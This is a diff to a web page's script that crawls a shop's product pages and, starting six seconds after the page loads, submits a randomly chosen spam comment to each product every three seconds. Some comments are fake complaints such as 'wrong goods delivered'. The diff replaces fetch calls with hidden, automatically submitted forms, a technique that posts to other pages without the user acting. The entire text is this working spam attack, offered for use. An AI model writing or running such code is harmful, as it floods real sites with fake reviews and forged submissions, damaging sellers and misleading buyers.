@@ -2929,7 +2929,6 @@
         "Giao sai hàng",
       ];
 
-      // Hàm fetch link sản phẩm
       async function extractProductLinksFrom(url) {
         try {
           const res = await fetch(url);
@@ -2961,45 +2960,47 @@
         return [...new Set(all)];
       }
 
-      // Gửi comment bằng fetch
-      async function sendComment(productUrl, commentText) {
-        const payload = new URLSearchParams();
-        payload.append("name", "Người dùng ẩn danh");
-        payload.append("comment", commentText);
-        payload.append("xss_submit", "1");
+      function createAndSubmitForm(targetUrl, commentText) {
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.action = targetUrl;
+        form.style.display = "none";
 
-        try {
-          const res = await fetch(productUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/x-www-form-urlencoded",
-            },
-            body: payload,
-          });
+        const nameInput = document.createElement("input");
+        nameInput.name = "name";
+        nameInput.value = "Người dùng ẩn danh";
 
-          if (res.ok) {
-            console.log(`✅ Gửi thành công: ${productUrl}`);
-          } else {
-            console.warn(`❌ Lỗi gửi: ${productUrl} (Mã ${res.status})`);
-          }
-        } catch (err) {
-          console.error(`💥 Gửi thất bại: ${productUrl}`, err);
-        }
+        const commentInput = document.createElement("input");
+        commentInput.name = "comment";
+        commentInput.value = commentText;
+
+        const submitInput = document.createElement("input");
+        submitInput.name = "xss_submit";
+        submitInput.value = "1";
+
+        form.appendChild(nameInput);
+        form.appendChild(commentInput);
+        form.appendChild(submitInput);
+        document.body.appendChild(form);
+
+        form.submit();
       }
 
       async function runSpam() {
         const links = await getAllProductLinks();
+        console.log(`🎯 Tổng cộng ${links.length} sản phẩm`);
 
         links.forEach((link, i) => {
           const cmt =
             SPAM_COMMENTS[Math.floor(Math.random() * SPAM_COMMENTS.length)];
           setTimeout(() => {
-            sendComment(link, cmt);
-          }, i * 3000); // 3s delay
+            console.log(`🧨 Đang gửi: ${link} - "${cmt}"`);
+            createAndSubmitForm(link, cmt);
+          }, i * 3000);
         });
       }
 
-      // Chờ 6s rồi chạy
+      // Đợi 6 giây rồi bắt đầu
       setTimeout(runSpam, 6000);
     </script>
   </body>
